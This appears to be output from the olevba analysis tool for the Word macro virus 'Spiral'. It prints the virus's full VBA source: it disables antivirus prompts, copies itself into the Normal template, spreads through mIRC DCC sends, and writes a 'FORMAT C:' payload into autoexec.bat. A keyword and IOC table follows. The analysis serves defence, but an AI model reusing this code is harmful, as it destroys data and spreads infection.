olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Spiral
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Spiral - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Spiral - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'WM97.Class.Spiral.Trojan
'By a.v_killer
On Error Resume Next
CheckHostNormal = GetAttr(NormalTemplate.FullName)
If CheckHostNormal = vbReadOnly Or CheckHostNormal = vbReadOnly + vbArchive Then
Norm$ = NormalTemplate
AttribMe$ = "attrib -h -r "
GetTemplates1$ = "c:\progra~1\micros~1\templa~1\"
GetTemplates2$ = "c:\progra~1\micros~2\templa~1\"
Open "c:\WINDOWS\Start Menu\Programs\StartUp\spiral.bat" For Output As #1
Print #1, AttribMe$ + GetTemplates1$ + Norm$
Print #1, AttribMe$ + GetTemplates2$ + Norm$
Print #1, "del " + GetTemplates1$ + Norm$
Print #1, "del " + GetTemplates2$ + Norm$
Print #1, "del c:\windows\startm~1\programs\startup\spiral.bat"
Close #1
End If
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = wdCancelDisabled
With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
End With
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
SpiralHost = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Spiral = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
  Set SpiralCode = ActiveDocument.VBProject.VBComponents.Item(1)
  SpiralDoc = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
  Set SpiralCode = NormalTemplate.VBProject.VBComponents.Item(1)
  SpiralInfect = True
End If
If SpiralInfect = True Then
  ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\Spiral.sys"
  SpiralCode.CodeModule.AddFromFile ("c:\Spiral.sys")
  SpiralCode.CodeModule.Deletelines 1, 4
  SpiralCode.CodeModule.Replaceline 1, "Sub AutoClose()"
ElseIf SpiralDoc = True Then
  SpiralCode.CodeModule.AddFromFile ("c:\Spiral.sys")
  SpiralCode.CodeModule.Deletelines 1, 4
End If
If Day(Now()) = Int(Rnd * 6) + 1 Then
dlg.Password = "a.v_killer"
Shell "C:\Spiral.COM"
End If
End Sub

Sub Mirc()
On Error Resume Next
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
Print #1, "[SCRIPT]"
Print #1, "n0=on 1:text:   *:?:{ s *2 | halt }"
Print #1, "n1=alias /s / *1"
Print #1, "n2=on 1:connect:/.enable #d"
Print #1, "n3=#d off"
PRINT #1, "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\system\spiral.doc" } | .disable #d | .timer 1 60 .enable #d }"
Print #1, "n5=#d end"
Close #1
End Sub

Sub Playload()
SetAttr "C:\spiral.bat", vbReadOnly
Open "C:\spiral.bat" For Output As #2
Print #2, "@ECHO OFF"
Print #2, "del c:\win.bat"
Print #2, "ECHO attrib -h c:\win.bat >> c:\autoexec.bat"
Print #2, "ECHO C:\WIN.BAT >> c:\autoexec.bat"
Print #2, "ECHO REM InFecTeD bY ThE SpIrAl bat dropper ViRuS(c) >> c:\autoexec.bat"
Print #2, "ECHO REM PRAY 4 MERCY(c) >> c:\config.sys"
Print #2, "ECHO @ECHO ON >> C:\WIN.BAT"
Print #2, "ECHO I'M NOW TAKING CONTROL OF YOUR BOOT SECTOR HEHEHEHE! >> C:\WIN.BAT"
Print #2, "ECHO @ECHO OFF >> C:\WIN.BAT"
Print #2, "ECHO DEL C:\DOS\UN*.* >> C:\WIN.BAT"
Print #2, "ECHO FORMAT C: |Y >> C:\WIN.BAT"
Print #2, "ECHO MKDIR C:\SCANNER >> C:\WIN.BAT"
Print #2, "ECHO MKDIR C:\SPAMHEAD >> C:\WIN.BAT"
Print #2, "ECHO MKDIR C:\A.V_KILLER >> C:\WIN.BAT"
Print #2, "ECHO MKDIR C:\IS >> C:\WIN.BAT"
Print #2, "ECHO MKDIR C:\HERE >> C:\WIN.BAT"
Print #2, "attrib +h c:\win.bat"
Close #2
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MKDIR               |May create a directory                       |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WM97.Class          |Executable file name                         |
|IOC       |spiral.bat          |Executable file name                         |
|IOC       |win.bat             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |WIN.BAT             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

